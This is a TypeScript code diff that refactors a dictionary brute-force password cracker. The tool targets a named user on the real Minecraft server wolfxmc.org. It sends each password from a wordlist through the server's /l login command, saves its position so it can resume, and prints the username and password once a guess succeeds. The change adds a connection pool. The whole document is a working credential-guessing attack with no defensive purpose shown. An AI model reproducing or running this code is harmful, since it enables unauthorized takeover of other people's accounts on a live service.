@@ -6,16 +6,7 @@ import { Minecraft } from "./minecraft";
 import { promises as fs } from "fs";
 import { last, lastIndexOf } from "lodash";
 import Logger from "bunyan";
-
-async function createMinecraftInstance(username: string) {
-	const mc = new Minecraft({
-		username,
-		host: 'wolfxmc.org',
-		port: 25565
-	}, Logger.WARN);
-	await mc.waitForMessage(messageWaitForLogin, [messageWaitForRegister]);
-	return mc;
-}
+import { MinecraftPool } from "./pool";
 
 async function tryPassword(mc: Minecraft, password: string) {
 	mc.bot.chat(`/l ${password}`);
@@ -35,19 +26,19 @@ async function runOnce(targetUser: string) {
 	} catch (e) {
 		console.log(`Will start from beginning.`);
 	}
-	const dict = (await fs.readFile("./data/dict.txt", "utf-8")).split("\n");
-	let mc: Minecraft;
-	//await waitBotLogin(bot);
-	//await delay(1000);
+	const dict = (await fs.readFile("./dict.txt", "utf-8")).split("\n");
+	console.log(`Starting crack user ${targetUser}`);
+	const pool = new MinecraftPool(1, {
+		username: targetUser,
+		host: 'wolfxmc.org',
+		port: 25565
+	});
 	try {
 		for (let i = lastSequence; i < dict.length; ++i) {
-			if (!mc || mc.died) {
-				console.log("Connecting.");
-				mc = await createMinecraftInstance(targetUser);
-			}
-			await fs.writeFile("./data/last.json", JSON.stringify({ lastSequence: i }));
 			const password = dict[i];
-			console.log(`Trying password ${password}`)
+			await fs.writeFile("./data/last.json", JSON.stringify({ lastSequence: i }));
+			const mc = await pool.pickOne();
+			console.log(`Trying password ${password}`);
 			if (await tryPassword(mc, password)) {
 				console.log(`Success. Username: ${targetUser} Password: ${password}`);
 				break;
@@ -56,8 +47,8 @@ async function runOnce(targetUser: string) {
 	} catch (e) {
 		console.log(`Failed: ${e.toString()}`);
 	} finally {
-		mc.bot.end();
 		console.error(`Finished.`);
+		process.exit();
 	}
 }
 runOnce(process.argv[2]);
